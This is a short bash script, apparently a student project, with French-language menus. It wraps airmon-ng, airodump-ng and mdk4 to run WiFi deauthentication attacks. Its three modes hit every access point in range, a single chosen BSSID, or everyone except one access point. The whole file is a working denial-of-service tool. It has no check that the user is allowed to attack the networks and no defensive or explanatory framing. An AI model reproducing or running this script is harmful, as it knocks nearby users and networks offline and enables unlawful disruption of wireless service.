# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    script.sh                                          :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: azouaiga <azouaiga@student.1337.ma>        +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2022/01/23 01:15:10 by azouaiga          #+#    #+#              #
#    Updated: 2022/01/29 09:49:23 by azouaiga         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

#!/bin/bash

clear

menu="1) Lancer une attaque non ciblée\n2) Cibler un BSSID d'un point d'accès\n3) Cibler tout le monde sauf un point d'accès\n4) Quitter"

options=("Lancer une attaque non ciblée" "Cibler un BSSID d'un point d'accès" "Cibler tout le monde sauf un point d'accès" "Quitter")

PS3=$optionsprompt
select opt in "${options[@]}"
do
    case $opt in
        "Lancer une attaque non ciblée")
		clear
		echo "***Attaque non ciblée...****">>log.txt
		date>>log.txt
		echo "Activation du monitoring mode..." | tee -a log.txt
		sleep 1
		sudo airmon-ng check kill | tee -a log.txt
		sudo airmon-ng stop wlp3s0mon | tee -a log.txt
		sudo airmon-ng start wlp3s0 | tee -a  log.txt
		sleep 2
		clear
		echo -e "Deauthentication en cours...\nPour quitter veuillez appuyer sur CTRL-C ou CTRL-Z"
		sudo mdk4 wlp3s0mon d | tee -a log.txt
            ;;
        "Cibler un BSSID d'un point d'accès")
	    	clear
		echo "***Attaque ciblée...****">>log.txt
                date>>log.txt
		echo -e "Une nouvelle fenêtre va s'ouvrir.\nVeuillez copier l'adresse MAC de l'AP souhaité et collez-le ici."
		sleep 2
		gnome-terminal --title="BALAYAGE EN COURS" -e "sudo airodump-ng wlp3s0mon"
		read -p "Adresse MAC cible: " mac
		echo "MAC Cible = $mac">>log.txt
		echo "Activation du monitoring mode..." | tee -a log.txt
                sleep 1
                sudo airmon-ng check kill | tee -a log.txt
                sudo airmon-ng stop wlp3s0mon | tee -a log.txt
                sudo airmon-ng start wlp3s0 | tee -a  log.txt
                sleep 2
                clear
                echo -e "Deauthentication en cours de la cible $mac...\nPour quitter veuillez appuyer sur CTRL-C ou CTRL-Z"
                sudo mdk4 wlp3s0mon d -B $mac | tee -a log.txt
            ;;
	"Cibler tout le monde sauf un point d'accès")
		clear
                echo "***Attaque ciblée...****">>log.txt
                date>>log.txt
                echo -e "Une nouvelle fenêtre va s'ouvrir.\nVeuillez copier l'adresse MAC de l'AP souhaité et collez-le ici."
                sleep 2
		gnome-terminal --title="BALAYAGE EN COURS" -e "sudo airodump-ng wlp3s0mon"
                read -p "Adresse MAC cible: " mac
                echo "MAC Cible = $mac">>log.txt
                echo "Activation du monitoring mode..." | tee -a log.txt
                sleep 1
                sudo airmon-ng check kill | tee -a log.txt
                sudo airmon-ng stop wlp3s0mon | tee -a log.txt
                sudo airmon-ng start wlp3s0 | tee -a  log.txt
                sleep 2
                clear
                echo -e "Deauthentication en cours de la cible $mac...\nPour quitter veuillez appuyer sur CTRL-C ou CTRL-Z"
                sudo mdk4 wlp3s0mon d -W $mac | tee -a log.txt
	    ;;
        "Quitter")
            	break
            ;;
        *) 
		echo "Option invalide!"
		sleep 1
		echo -e $menu
	   ;;
    esac
done
